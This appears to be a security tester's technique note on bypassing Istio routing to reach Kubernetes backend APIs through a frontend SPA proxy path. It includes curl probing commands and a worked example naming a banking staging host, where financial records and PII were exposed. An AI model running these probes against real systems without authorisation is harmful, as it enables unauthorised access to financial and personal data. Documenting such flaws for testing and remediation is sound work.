# SPA Proxy Path Bypass (Istio/K8s)

## Pattern

When a K8s-hosted application has:
- A frontend SPA at `/app-prefix/frontend-client/`
- Backend services at `/app-prefix/service-name/`
- Istio/Envoy routing

The SPA path may proxy API requests to backends WITHOUT authentication, while direct service paths are blocked by Istio (400 "Bad Request").

## Detection

1. **Identify SPA base path** from HTML: `<base href=/app-jfs/jfs-client/ >`
2. **Identify backend service paths** from JS source maps / config:
   - `URL.API_LOAN.BASE_URL: 'loan/v1'`
   - `URL.API_JFS.BASE_URL: 'jfs'`
3. **Test direct service path**: GET /app-jfs/loan-service/jfs/endpoint → 400 (Istio blocks)
4. **Test via SPA proxy**: GET /app-jfs/jfs-client/jfs/endpoint → 200 (bypasses!)

## Key Signals

- Direct path returns `400` with body "Bad Request" (11 bytes, text/plain)
- Response has `server: istio-envoy` and `x-envoy-upstream-service-time` headers
- This is NOT an auth error — it's Istio routing policy rejecting the request
- The SPA path has different routing rules (passes through to backend)

## Verification

```bash
# Step 1: Get SPA base from HTML
curl -sk https://target/app-prefix/frontend/ | grep -oE 'base href=[^>]*'

# Step 2: Get service paths from JS config (source maps or minified)
grep -oE '"(loan|jfs|api|private|foundation)/[^"]*"' /tmp/app.js | sort -u

# Step 3: Test via SPA prefix
for path in "/jfs/endpoint" "/loan/v1/endpoint" "/private/endpoint"; do
  echo "Direct:  $(curl -sk -w '%{http_code}' -o /dev/null https://target/app-prefix/service${path})"
  echo "SPA:     $(curl -sk -w '%{http_code}' -o /dev/null https://target/app-prefix/frontend${path})"
done
```

## LoanPlatform Example (June 2026)

- Target: stg-banking-k8s.bankartos.io
- SPA base: `/app-jfs/jfs-client/`
- Service: `/app-jfs/loan-service/` → always 400
- Bypass: `/app-jfs/jfs-client/jfs/*` → 200 (5,327 financial records)
- Bypass: `/app-jfs/jfs-client/private/*` → 200 (partner data)
- Bypass: `/app-jfs/jfs-client/loan/v1/*` → 200/500 (loan data)

## Impact

- Complete auth bypass on all backend services
- Financial data (batch records, disbursements, repayments)
- PII exposure (NPWP, phone, email on production)
- Business partner relationships
- Internal configuration (accounting, session timeout)

## Root Cause

Istio VirtualService routes:
- `/app-jfs/loan-service/*` → requires specific header/auth (returns 400 without)
- `/app-jfs/jfs-client/*` → passes ALL requests to backend (intended for SPA assets, but forwards API calls too)

The SPA's nginx/proxy config doesn't distinguish between static asset requests and API proxy requests.
